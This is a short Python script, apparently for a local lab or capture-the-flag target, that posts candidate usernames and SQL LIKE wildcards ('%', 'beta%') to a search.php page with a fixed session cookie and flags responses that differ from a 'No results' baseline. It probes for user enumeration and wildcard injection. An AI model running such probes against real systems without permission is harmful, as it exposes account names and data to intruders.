import requests

# Target configuration
url = "http://127.0.0.1:8080/search.php"
cookies = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}
headers = {"Content-Type": "application/x-www-form-urlencoded"}

# Baseline response
baseline = "You are connected successfully!<br/> No results"

# Test usernames - focused list
test_usernames = [
    "alice", "bob", "charlie", "david", "eve",
    "admin", "user", "test", "guest",
    "beta", "betauser", "betatester",
    "user1", "user2",
    "%", "%%", "beta%", "%beta"
]

print(f"Testing {len(test_usernames)} usernames")

different = []

for username in test_usernames:
    data = {"username": username}
    resp = requests.post(url, headers=headers, cookies=cookies, data=data)
    
    if resp.text.strip() != baseline.strip():
        print(f"\n[DIFFERENT] username: {username}")
        print(f"Status: {resp.status_code} | Length: {len(resp.text)}B")
        print(f"Response:\n{resp.text}")
        different.append(username)

print(f"\n\nSummary: {len(different)} different responses out of {len(test_usernames)} tested")
if different:
    print(f"Usernames with different responses: {different}")

